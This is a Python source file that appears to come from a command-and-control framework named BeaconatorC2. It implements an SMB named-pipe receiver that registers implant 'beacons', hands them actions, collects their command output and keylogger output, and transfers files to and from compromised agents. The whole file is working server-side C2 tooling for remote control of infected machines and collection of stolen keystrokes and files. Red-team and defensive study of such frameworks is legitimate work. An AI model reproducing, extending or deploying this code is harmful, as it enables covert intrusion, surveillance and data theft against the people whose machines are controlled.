import socket
import threading
import time
import os
from typing import Dict, Any, Optional
from pathlib import Path
from .base_receiver import BaseReceiver, ReceiverStatus
from .encoding_strategies import EncodingStrategy
from .receiver_config import ReceiverConfig
import utils

class SMBNamedPipeHandler:
    """Handles SMB named pipe connections using BaseReceiver functionality"""
    
    def __init__(self, receiver_instance):
        self.receiver_instance = receiver_instance
    
    def handle_pipe_connection(self, pipe_handle, client_info: Dict[str, Any]):
        """Handle an SMB named pipe connection"""
        
        try:
            # Read initial data from pipe
            initial_data_raw = self._read_from_pipe(pipe_handle, self.receiver_instance.config.buffer_size)
            if not initial_data_raw:
                return
                
            # Decode the data
            try:
                initial_data_decoded = self.receiver_instance.encoding_strategy.decode(initial_data_raw)
                initial_data = initial_data_decoded.decode('utf-8').strip()
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"SMB decoding error from {client_info}: {e}")
                return
                
            parts = initial_data.split('|')
            command = parts[0] if parts else ""
            
            # Update stats using thread-safe method
            self.receiver_instance.update_bytes_received(len(initial_data_raw))
            
            if command in ("to_agent", "from_agent"):
                self.receiver_instance.handle_file_transfer_smb(pipe_handle, command, parts, client_info)
            else:
                self.receiver_instance.handle_command_processing_smb(pipe_handle, initial_data, client_info)
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"SMB Connection Error: {client_info} - {str(e)}")
        finally:
            try:
                self._close_pipe(pipe_handle)
            except:
                pass
    
    def _read_from_pipe(self, pipe_handle, buffer_size: int) -> bytes:
        """Read data from named pipe (platform-specific implementation)"""
        try:
            if os.name == 'nt':  # Windows
                import win32file
                import win32pipe
                result, data = win32file.ReadFile(pipe_handle, buffer_size)
                return data
            else:  # Unix-like (using FIFO)
                # On Unix systems, we simulate named pipes with FIFOs
                with open(pipe_handle, 'rb') as f:
                    return f.read(buffer_size)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error reading from SMB pipe: {e}")
            return b""
    
    def _write_to_pipe(self, pipe_handle, data: bytes) -> bool:
        """Write data to named pipe (platform-specific implementation)"""
        try:
            if os.name == 'nt':  # Windows
                import win32file
                win32file.WriteFile(pipe_handle, data)
                return True
            else:  # Unix-like (using FIFO)
                with open(pipe_handle, 'wb') as f:
                    f.write(data)
                return True
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error writing to SMB pipe: {e}")
            return False
    
    def _close_pipe(self, pipe_handle):
        """Close named pipe handle"""
        try:
            if os.name == 'nt':  # Windows
                import win32file
                win32file.CloseHandle(pipe_handle)
            else:  # Unix-like
                # For FIFO, handle is a path string, no explicit close needed
                pass
        except Exception:
            pass

class SMBReceiver(BaseReceiver):
    """SMB named pipe receiver implementation with encoding support"""
    
    def __init__(self, config: ReceiverConfig, encoding_strategy: EncodingStrategy):
        super().__init__(config.receiver_id, config.name, encoding_strategy)
        self.config = config
        self.pipe_handle: Optional[Any] = None
        self.pipe_path: Optional[str] = None
        self.connection_handler: Optional[SMBNamedPipeHandler] = None
        
        # SMB-specific configuration
        self.pipe_name = config.protocol_config.get('pipe_name', f'BeaconatorC2_{config.port}')
        
    def _setup_receiver(self) -> bool:
        """Setup SMB named pipe server"""
        try:
            # Create SMB connection handler
            self.connection_handler = SMBNamedPipeHandler(self)
            
            if os.name == 'nt':  # Windows
                self._setup_windows_pipe()
            else:  # Unix-like systems
                self._setup_unix_fifo()
            
            return True
            
        except Exception as e:
            self.error_occurred.emit(self.receiver_id, f"SMB setup failed: {str(e)}")
            return False
    
    def _setup_windows_pipe(self):
        """Setup Windows named pipe"""
        try:
            import win32pipe
            import win32file
            
            self.pipe_path = f"\\\\.\\pipe\\{self.pipe_name}"
            
            self.pipe_handle = win32pipe.CreateNamedPipe(
                self.pipe_path,
                win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
                win32pipe.PIPE_UNLIMITED_INSTANCES,
                self.config.buffer_size,
                self.config.buffer_size,
                300,  # Default timeout
                None
            )
            
            if self.pipe_handle == win32file.INVALID_HANDLE_VALUE:
                raise Exception("Failed to create named pipe")
                
        except ImportError:
            raise Exception("pywin32 package required for Windows SMB support")
    
    def _setup_unix_fifo(self):
        """Setup Unix FIFO (named pipe simulation)"""
        try:
            # Create FIFO path
            fifo_dir = Path("/tmp/beaconator_c2_pipes")
            fifo_dir.mkdir(exist_ok=True)
            self.pipe_path = str(fifo_dir / self.pipe_name)
            
            # Remove existing FIFO if it exists
            if os.path.exists(self.pipe_path):
                os.unlink(self.pipe_path)
            
            # Create FIFO
            os.mkfifo(self.pipe_path, 0o600)  # Restrict permissions
            
        except Exception as e:
            raise Exception(f"Failed to create FIFO: {e}")
            
    def _start_listening(self):
        """Start listening for SMB named pipe connections"""
        if not self.pipe_handle and not self.pipe_path:
            return
            
        try:
            if os.name == 'nt':  # Windows
                self._listen_windows_pipe()
            else:  # Unix-like
                self._listen_unix_fifo()
                
        except Exception as e:
            if not self._shutdown_event.is_set():
                self.error_occurred.emit(self.receiver_id, f"SMB listening error: {str(e)}")
    
    def _listen_windows_pipe(self):
        """Listen for Windows named pipe connections"""
        import win32pipe
        import win32file
        import pywintypes
        
        while not self._shutdown_event.is_set():
            try:
                # Wait for client connection with timeout
                win32pipe.ConnectNamedPipe(self.pipe_handle, None)
                
                # Update connection stats
                self.increment_active_connections()
                
                try:
                    # Handle the connection
                    client_info = {"type": "named_pipe", "path": self.pipe_path}
                    self.connection_handler.handle_pipe_connection(self.pipe_handle, client_info)
                finally:
                    self.decrement_active_connections()
                    # Disconnect and prepare for next connection
                    win32pipe.DisconnectNamedPipe(self.pipe_handle)
                    
            except pywintypes.error as e:
                if self._shutdown_event.is_set():
                    break
                if utils.logger:
                    utils.logger.log_message(f"Windows pipe error: {e}")
                time.sleep(0.1)
    
    def _listen_unix_fifo(self):
        """Listen for Unix FIFO connections"""
        while not self._shutdown_event.is_set():
            try:
                # Check if FIFO exists and is readable
                if os.path.exists(self.pipe_path):
                    # Update connection stats
                    self.increment_active_connections()
                    
                    try:
                        # Handle the connection
                        client_info = {"type": "fifo", "path": self.pipe_path}
                        self.connection_handler.handle_pipe_connection(self.pipe_path, client_info)
                    finally:
                        self.decrement_active_connections()
                
                # Small delay to prevent busy waiting
                time.sleep(0.1)
                
            except Exception as e:
                if self._shutdown_event.is_set():
                    break
                if utils.logger:
                    utils.logger.log_message(f"FIFO error: {e}")
                time.sleep(1)
                
    def _cleanup_receiver(self):
        """Cleanup SMB resources"""
        try:
            if os.name == 'nt' and self.pipe_handle:  # Windows
                import win32file
                win32file.CloseHandle(self.pipe_handle)
            elif self.pipe_path and os.path.exists(self.pipe_path):  # Unix-like
                os.unlink(self.pipe_path)
        except Exception:
            pass
        finally:
            self.pipe_handle = None
            self.pipe_path = None
    
    def _send_data(self, sock: socket.socket, data: bytes) -> bool:
        """Send data through SMB pipe (not applicable for traditional socket)"""
        # This is required by abstract base class but SMB uses pipes, not sockets
        return False
    
    def _receive_data(self, sock: socket.socket, buffer_size: int) -> bytes:
        """Receive data through SMB pipe (not applicable for traditional socket)"""
        # This is required by abstract base class but SMB uses pipes, not sockets
        return b""
    
    def handle_file_transfer_smb(self, pipe_handle, command: str, parts: list, client_info: Dict[str, Any]):
        """Handle SMB file transfer"""
        if len(parts) < 2:
            response = self.encoding_strategy.encode(b"ERROR|Invalid file transfer command")
            self.connection_handler._write_to_pipe(pipe_handle, response)
            return
            
        filename = parts[1]
        
        if command == "to_agent":
            # Send file through pipe
            self._send_file_smb(pipe_handle, filename)
        else:  # from_agent
            # Receive file through pipe
            ready_response = self.encoding_strategy.encode(b"READY")
            self.connection_handler._write_to_pipe(pipe_handle, ready_response)
            self._receive_file_smb(pipe_handle, filename)
    
    def handle_command_processing_smb(self, pipe_handle, initial_data: str, client_info: Dict[str, Any]):
        """Handle SMB command processing"""
        try:
            keep_alive = self._process_command_smb(pipe_handle, initial_data)
            if not keep_alive:
                return
                
            # For SMB pipes, we typically handle one command per connection
            # But we can implement a simple loop for keep-alive commands
            timeout_count = 0
            max_timeouts = 10
            
            while timeout_count < max_timeouts and not self._shutdown_event.is_set():
                try:
                    data_raw = self.connection_handler._read_from_pipe(pipe_handle, self.config.buffer_size)
                    if not data_raw:
                        timeout_count += 1
                        time.sleep(0.1)
                        continue
                        
                    data_decoded = self.encoding_strategy.decode(data_raw)
                    data = data_decoded.decode('utf-8').strip()
                    self.update_bytes_received(len(data_raw))
                    
                    keep_alive = self._process_command_smb(pipe_handle, data)
                    if not keep_alive:
                        break
                    timeout_count = 0  # Reset timeout counter
                        
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error processing SMB command from {client_info}: {e}")
                    break
                    
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in SMB command handler for {client_info}: {e}")
    
    def _process_command_smb(self, pipe_handle, data: str) -> bool:
        """Process SMB pipe commands"""
        single_transaction_commands = {
            "register", "request_action", "checkin", "command_output", "keylogger_output"
        }
        
        parts = data.split('|')
        if not parts:
            error_response = self.encoding_strategy.encode(b"Invalid command format")
            self.connection_handler._write_to_pipe(pipe_handle, error_response)
            self.update_bytes_sent(len(error_response))
            return False
            
        command = parts[0]
        
        try:
            # Use existing command processor logic
            if command == "command_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                response = self.command_processor.process_command_output(beacon_id, output)
            elif command == "keylogger_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = data.split('|', 2)[2] if len(parts) > 2 else ""
                response = self.command_processor.process_keylogger_output(beacon_id, output)
            else:
                # Standard command dispatch
                response = {
                    "register": lambda: self.command_processor.process_registration(
                        parts[1], parts[2], self.receiver_id, self.name
                    ) if len(parts) == 3 else "Invalid registration format",
                    
                    "request_action": lambda: self.command_processor.process_action_request(
                        parts[1], self.receiver_id, self.name
                    ) if len(parts) == 2 else "Invalid request format",
                    
                    "download_complete": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_complete"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "download_failed": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_failed"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "checkin": lambda: "Check-in acknowledged"
                        if len(parts) == 2 else "Invalid checkin format",
                }.get(command, lambda: "Unknown command")()
                
            # Encode and send response
            encoded_response = self.encoding_strategy.encode(response.encode('utf-8'))
            self.connection_handler._write_to_pipe(pipe_handle, encoded_response)
            self.update_bytes_sent(len(encoded_response))
            
            return command not in single_transaction_commands
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing SMB command {command}: {e}")
            return False
    
    def _send_file_smb(self, pipe_handle, filename: str) -> bool:
        """Send file through SMB pipe"""
        try:
            from config import ServerConfig
            from werkzeug.utils import secure_filename
            
            config = ServerConfig()
            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
            if not filepath.exists():
                error_response = self.encoding_strategy.encode(b'ERROR|File not found')
                self.connection_handler._write_to_pipe(pipe_handle, error_response)
                return False
            
            CHUNK_SIZE = 8192  # Smaller chunks for pipes
            bytes_sent = 0
            
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                        
                    # Encode the chunk
                    encoded_chunk = self.encoding_strategy.encode(chunk)
                    if self.connection_handler._write_to_pipe(pipe_handle, encoded_chunk):
                        bytes_sent += len(encoded_chunk)
                        self.update_bytes_sent(len(encoded_chunk))
                    else:
                        break
                    
            if utils.logger:
                utils.logger.log_message(f"SMB file transfer complete: {filename} ({bytes_sent} bytes)")
            return True
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in SMB file send: {e}")
            return False
    
    def _receive_file_smb(self, pipe_handle, filename: str) -> bool:
        """Receive file through SMB pipe"""
        try:
            from config import ServerConfig
            from werkzeug.utils import secure_filename
            
            config = ServerConfig()
            filepath = Path(config.FILES_FOLDER) / secure_filename(filename)
            
            with open(filepath, 'wb') as f:
                total_received = 0
                timeout_count = 0
                max_timeouts = 50  # Allow some timeouts for pipe operations
                
                while timeout_count < max_timeouts:
                    encoded_chunk = self.connection_handler._read_from_pipe(pipe_handle, 8192)
                    if not encoded_chunk:
                        timeout_count += 1
                        time.sleep(0.01)
                        continue
                        
                    # Decode the chunk
                    chunk = self.encoding_strategy.decode(encoded_chunk)
                    f.write(chunk)
                    
                    total_received += len(encoded_chunk)
                    self.update_bytes_received(len(encoded_chunk))
                    timeout_count = 0  # Reset timeout counter
                        
            if total_received > 0:
                success_response = self.encoding_strategy.encode(b'SUCCESS')
                self.connection_handler._write_to_pipe(pipe_handle, success_response)
                self.update_bytes_sent(len(success_response))
                if utils.logger:
                    utils.logger.log_message(f"SMB file received: {filename} ({total_received} bytes)")
                return True
            else:
                error_response = self.encoding_strategy.encode(b'ERROR|No data received')
                self.connection_handler._write_to_pipe(pipe_handle, error_response)
                return False
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in SMB file receive: {e}")
            return False
                
    def get_configuration(self) -> Dict[str, Any]:
        """Get SMB receiver configuration"""
        return {
            "pipe_name": self.pipe_name,
            "buffer_size": self.config.buffer_size,
            "timeout": self.config.timeout,
            "encoding": self.encoding_strategy.get_name(),
            "platform": "Windows" if os.name == 'nt' else "Unix-like"
        }
        
    def update_configuration(self, config_updates: Dict[str, Any]) -> bool:
        """Update SMB receiver configuration"""
        try:
            if "pipe_name" in config_updates:
                self.pipe_name = config_updates["pipe_name"]
                
            if "buffer_size" in config_updates:
                self.config.buffer_size = int(config_updates["buffer_size"])
                
            # Restart if running to apply changes
            if self.status == ReceiverStatus.RUNNING:
                return self.restart()
                
            return True
            
        except Exception:
            return False